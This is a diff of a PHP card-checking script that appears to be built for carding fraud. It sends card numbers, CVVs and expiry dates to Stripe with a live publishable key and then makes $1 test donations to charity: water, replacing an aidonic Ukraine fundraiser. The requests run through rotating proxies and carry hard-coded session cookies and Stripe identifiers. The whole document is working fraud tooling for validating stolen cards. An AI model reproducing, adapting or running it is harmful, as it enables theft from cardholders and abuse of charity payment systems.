@@ -260,7 +260,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][country]=US&billing_details[address][postal_code]=10080&billing_details[name]='.$name.'+'.$last.'&billing_details[email]='.$email.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F8a610fecd%3B+stripe-js-v3%2F8a610fecd&time_on_page=327963&key=pk_live_51KYSrxADiigBR9DYEIyNaoaO5SdnObRCmXxnDrKHOEfuxU1YvysCcOOdrZlT9ej3ELfqueOz2JsVpVkUkdYFxhfI00rYVOZjt0');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][postal_code]='.$postcode.'&billing_details[address][city]='.$city.'&billing_details[address][country]=US&billing_details[address][line1]='.$street.'&billing_details[email]='.$email.'&billing_details[name]='.$name.'+'.$last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=8a222f87-65f7-4425-a54a-b6349c1249bf0c6a7f&muid=f00de113-7632-48b1-86b8-92ace50482c96e911e&sid=c45b03ac-e668-4801-9feb-4ae692d30ce49ab970&pasted_fields=number&payment_user_agent=stripe.js%2F8a610fecd%3B+stripe-js-v3%2F8a610fecd&time_on_page=165104&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU');
 
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"'))); 
@@ -271,7 +271,7 @@ $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://api.aidonic.io/donations?source=donate-ukraine');
+curl_setopt($ch, CURLOPT_URL, 'https://www.charitywater.org/donate/stripe');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -282,16 +282,16 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: api.aidonic.io',
+'authority: www.charitywater.org',
 'method: POST',
-'path: /donations',
+'path: /donate/stripe',
 'scheme: https',
-'accept: application/json, text/plain, */*',
+'accept: application/json, */*',
 'accept-language: en-US,en;q=0.5',
 'content-type: application/json;charset=UTF-8',
-'cookie: ',
-'origin: https://my.aidonic.io',
-'referer: https://my.aidonic.io/',
+'cookie: countrypreference=US; optimizelyEndUserId=oeu1647446885586r0.6818315773764921; maji_utm={%22utm_campaign%22:%22brand_keywords_row_paid%22%2C%22utm_medium%22:%22ppc%22%2C%22utm_source%22:%22adwords%22}; ajs_anonymous_id=%22ab16bdff-3c93-40bf-bb5b-17136fbc3ceb%22; _ga=GA1.2.503274809.1647446892; _gid=GA1.2.137692945.1647446892; _gac_UA-3549292-2=1.1647446892.CjwKCAjwlcaRBhBYEiwAK341jfrkJXUzPLq8cJvxw2d0VmHCklmjIqiGb0EF0ulPifW-d9uAviyjcRoC5mUQAvD_BwE; _gcl_aw=GCL.1647446894.CjwKCAjwlcaRBhBYEiwAK341jfrkJXUzPLq8c…sImluU2FtcGxlIjp0cnVlfQ==; _hjIncludedInPageviewSample=1; _hjAbsoluteSessionInProgress=1; _fbp=fb.1.1647446899533.1241481705; _clck=15nuz6o|1|ezt|0; _clsk=9cfi0s|1647446924174|2|1|a.clarity.ms/collect; __stripe_mid=f00de113-7632-48b1-86b8-92ace50482c96e911e; __stripe_sid=c45b03ac-e668-4801-9feb-4ae692d30ce49ab970; _maji_consent={%22id%22:%2213916b36-4eb1-4f84-9c51-d80a8aaa48e5%22%2C%22policy_version%22:%222019.3%22}; _uetsid=49534480a54311ec8043fb50a6f7943a; _uetvid=49541080a54311ec8bc10592d83ae91b; _gat=1',
+'origin: https://www.charitywater.org',
+'referer: https://www.charitywater.org/',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-origin',
@@ -301,7 +301,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'{"aidonicFundName":"donate-ukraine","destination":"ca_GikDsv1mDZkFiKGViuiuDh9mzNEIhvzY","givenName":"'.$firstname.'","familyName":"'.$lastname.'","currency":"CHF","amount":2,"paymentMethodId":"'.$id.'","addressCountry":"US","postCode":"10080","email":"'.$email.'","preferredLanguage":"en","emailFollowUp":false,"comment":"","isAnonymous":false}');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'country=us&payment_intent%5Bemail%5D='.$email.'&payment_intent%5Bamount%5D=1&payment_intent%5Bcurrency%5D=usd&payment_intent%5Bmetadata%5D%5Banalytics_id%5D=ab16bdff-3c93-40bf-bb5b-17136fbc3ceb&payment_intent%5Bpayment_method%5D='.$id.'&disable_existing_subscription_check=false&donation_form%5Bamount%5D=1&donation_form%5Banonymous%5D=true&donation_form%5Bcomment%5D=&donation_form%5Bdisplay_name%5D=&donation_form%5Bemail%5D='.$email.'&donation_form%5Bname%5D='.$firstname.'&donation_form%5Bpayment_gateway_token%5D=&donation_form%5Bpayment_monthly_subscription%5D=false&donation_form%5Bsurname%5D=ldke&donation_form%5Bcampaign_id%5D=a5826748-d59d-4f86-a042-1e4c030720d5&donation_form%5Banalytics_uuid%5D=ab16bdff-3c93-40bf-bb5b-17136fbc3ceb&donation_form%5Bsetup_intent_id%5D=&donation_form%5Bsubscription_period%5D=&donation_form%5Bprofile_campaign_id%5D=&donation_form%5Bmetadata%5D%5Bexperiments%5D%5Bexperiment_21234970879%5D%5Bexperiment_id%5D=21234970879&donation_form%5Bmetadata%5D%5Bexperiments%5D%5Bexperiment_21234970879%5D%5Bexperiment_name%5D=US+-+Spring+Direct+-+New+1X+Gift+Array+-+Feb+2022&donation_form%5Bmetadata%5D%5Bexperiments%5D%5Bexperiment_21234970879%5D%5Bvariant_name%5D=Variation+%231&donation_form%5Bmetadata%5D%5Bexperiments%5D%5Bexperiment_21224171856%5D%5Bexperiment_id%5D=21224171856&donation_form%5Bmetadata%5D%5Bexperiments%5D%5Bexperiment_21224171856%5D%5Bexperiment_name%5D=US+-+Homepage+-+New+1X+Gift+Array+-+Feb+2022+with+Revenue&donation_form%5Bmetadata%5D%5Bexperiments%5D%5Bexperiment_21224171856%5D%5Bvariant_name%5D=Original&donation_form%5Bmetadata%5D%5Bfull_donate_page_url%5D=https%3A%2F%2Fwww.charitywater.org%2F&donation_form%5Bmetadata%5D%5Bphone_number%5D=&donation_form%5Bmetadata%5D%5Bphone_number_consent_granted%5D=&donation_form%5Bmetadata%5D%5Bplaid_account_id%5D=&donation_form%5Bmetadata%5D%5Bplaid_public_token%5D=&donation_form%5Bmetadata%5D%5Breferer%5D=https%3A%2F%2Fvietjack.com%2F&donation_form%5Bmetadata%5D%5Burl_params%5D%5Butm_campaign%5D=brand_keywords_row_paid&donation_form%5Bmetadata%5D%5Burl_params%5D%5Butm_medium%5D=ppc&donation_form%5Bmetadata%5D%5Burl_params%5D%5Butm_source%5D=adwords&donation_form%5Bmetadata%5D%5Burl_params%5D%5Btouch_type%5D=1&donation_form%5Bmetadata%5D%5Bwith_saved_payment%5D=false');
 
 
 $result2 = curl_exec($ch);
@@ -313,7 +313,7 @@ $time = $info['total_time'];
 
 //=======================[MADE BY]==============================//
 
-$MADEBY = "[ (🇮🇳)DRAGON MASTER ]";
+$MADEBY = "[ (BD)@Anonbd ]";
 
 //[You Have  To Change Name Here Automatically In All Response Will Change ]//
 
@@ -394,7 +394,7 @@ else {
 curl_close($ch);
 ob_flush();
 
-//echo "<b>1REQ Result:</b> $result1<br><br>";
+echo "<b>1REQ Result:</b> $result1<br><br>";
 echo "<b>2REQ Result:</b> $result2<br><br>";
 
 //=============================================================//
